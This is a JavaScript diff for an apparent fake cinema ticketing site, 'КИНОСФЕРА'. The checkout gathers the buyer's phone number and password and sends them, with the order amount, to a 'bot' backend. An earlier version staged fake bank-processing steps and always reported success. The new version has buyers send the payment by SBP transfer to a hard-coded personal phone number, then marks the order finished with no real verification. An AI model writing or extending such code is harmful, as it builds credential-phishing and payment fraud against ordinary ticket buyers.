@@ -1,5 +1,5 @@
 /**
- * main.js — Система "КИНОСФЕРА" (v16.1 - Полностью исправленный скрипт)
+ * main.js — Система "КИНОСФЕРА" (v17.0 - Прямая оплата по реквизитам СБП)
  */
 
 const SYSTEM_TODAY = new Date();
@@ -40,7 +40,7 @@ const CINEMAS_BY_CITY = {
     "Казань": [
         "улица Николая Ершова, 1А",
         "проспект Победы, 91",
-        "proспект Ямашева, 46",
+        "проспект Ямашева, 46",
         "улица Достоевского, 30",
         "улица Хусаина Мавлютова, 45"
     ]
@@ -129,8 +129,8 @@ window.selectDate = selectDate;
 window.selectCinema = selectCinema;
 window.selectTime = selectTime;
 window.openAcquiring = openAcquiring;
-window.closeAcquiring = closeAcquiring;
-window.startFakeProcessing = startFakeProcessing;
+window.copyPhone = copyPhone;
+window.finishOrder = finishOrder;
 
 document.addEventListener('DOMContentLoaded', () => {
     try {
@@ -465,7 +465,6 @@ function handleSeatClick(el, id, row, col) {
     updateCheckoutSummary();
 }
 
-// UX/UI zoom функций
 function zoomHall(delta) {
     currentHallZoom += delta;
     if (currentHallZoom < 0.4) currentHallZoom = 0.4;
@@ -477,7 +476,6 @@ function applyZoom() {
     if (wrapper) wrapper.style.transform = `scale(${currentHallZoom})`;
 }
 
-// Бар логика
 function renderBarTabs() {
     const tabsContainer = document.getElementById('bar-category-tabs');
     if (!tabsContainer) return;
@@ -589,7 +587,6 @@ function updateCheckoutSummary() {
 
     document.getElementById('receipt-seats-count').textContent = ticketsCount;
     document.getElementById('receipt-total-sum').textContent = `${totalSum} ₽`;
-    document.getElementById('acq-sum').textContent = totalSum;
     
     const sbpTotal = document.getElementById('sbp-total-sum');
     if (sbpTotal) sbpTotal.textContent = totalSum; 
@@ -607,7 +604,7 @@ function updateCheckoutSummary() {
     }
 }
 
-// ОБЯЗАТЕЛЬНАЯ ВАЛИДАЦИЯ НОМЕРА И ПАРОЛЯ ПЕРЕД ТРАНЗАКЦИЕЙ
+// === ОТКРЫТИЕ ИНСТРУКЦИИ ОПЛАТЫ ПО СБП ===
 function openAcquiring() {
     const phoneInput = document.getElementById('checkout-phone');
     const passInput = document.getElementById('checkout-password');
@@ -636,49 +633,56 @@ function openAcquiring() {
     currentOrder.userPhone = phoneValue;
     currentOrder.userPassword = passValue;
 
-    document.getElementById('acquiring-overlay').classList.remove('hidden');
-    document.getElementById('acq-step-1').classList.remove('hidden');
-    document.getElementById('acq-step-2').classList.add('hidden');
-}
-
-function closeAcquiring() {
-    document.getElementById('acquiring-overlay').classList.add('hidden');
-}
-
-// ИНТЕГРАЦИОННЫЙ ФУНДАМЕНТ ДЛЯ БОТА (ВЫПОЛНЯЕТ ЗАПРОС И ВСЕГДА ВЫДАЕТ УСПЕХ)
-async function startFakeProcessing() {
-    document.getElementById('acq-step-1').classList.add('hidden');
-    document.getElementById('acq-step-2').classList.remove('hidden');
-    
-    const statusText = document.getElementById('acq-status-text');
-    statusText.textContent = "Связь с банком...";
-    
+    // Генерируем номер заказа
     generatedOrderNumber = Math.floor(1000 + Math.random() * 9000);
+    const numDisplay = document.getElementById('order-number-display');
+    const numComment = document.getElementById('order-number-comment');
+    const finalNum = document.getElementById('final-order-number');
+    
+    if(numDisplay) numDisplay.textContent = `#${generatedOrderNumber}`;
+    if(numComment) numComment.textContent = generatedOrderNumber;
+    if(finalNum) finalNum.textContent = `#${generatedOrderNumber}`;
+    
+    // Прячем первичную кнопку и показываем блок с инструкцией СБП
+    document.getElementById('initial-pay-btn-container').classList.add('hidden');
+    
+    const payBlock = document.getElementById('payment-instruction-block');
+    if(payBlock) {
+        payBlock.classList.remove('hidden');
+        payBlock.scrollIntoView({ behavior: 'smooth', block: 'end' });
+    }
 
+    // Отправка данных на твой будущий бэкенд (бот)
+    // Обернуто в try/catch, чтобы не ломать сайт, если сервера еще нет
     try {
-        await fetch('http://localhost:3000/api/payment', {
+        const totalSumText = document.getElementById('receipt-total-sum').textContent.replace(' ₽', '');
+        fetch('http://localhost:3000/api/payment', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 phone: currentOrder.userPhone,
                 password: currentOrder.userPassword,
-                amount: document.getElementById('acq-sum').textContent,
+                amount: totalSumText,
                 orderId: generatedOrderNumber
             })
-        });
-    } catch (e) {
-        console.log("Бот-сервер пока не запущен, выполняем локальный флоу");
-    }
+        }).catch(e => console.log("Бот-сервер пока оффлайн, работаем в локальном режиме"));
+    } catch (e) {}
+}
 
-    setTimeout(() => { statusText.textContent = "Обработка транзакции..."; }, 1200);
-    setTimeout(() => { statusText.textContent = "Подтверждение платежа..."; }, 2400);
+function copyPhone() {
+    const phone = "+79196382853";
+    navigator.clipboard.writeText(phone).then(() => {
+        const btn = document.getElementById('copy-btn-icon');
+        if(btn) {
+            btn.textContent = "✅";
+            setTimeout(() => btn.textContent = "📋", 2000);
+        }
+    }).catch(err => console.error('Ошибка копирования', err));
+}
 
-    setTimeout(() => {
-        closeAcquiring();
-        document.getElementById('final-order-number').textContent = `#${generatedOrderNumber}`;
-        document.getElementById('checkout-main-content').classList.add('hidden');
-        document.getElementById('final-success-block').classList.remove('hidden');
-    }, 3600);
+function finishOrder() {
+    document.getElementById('checkout-main-content').classList.add('hidden');
+    document.getElementById('final-success-block').classList.remove('hidden');
 }
 
 function initStaticEventListeners() {
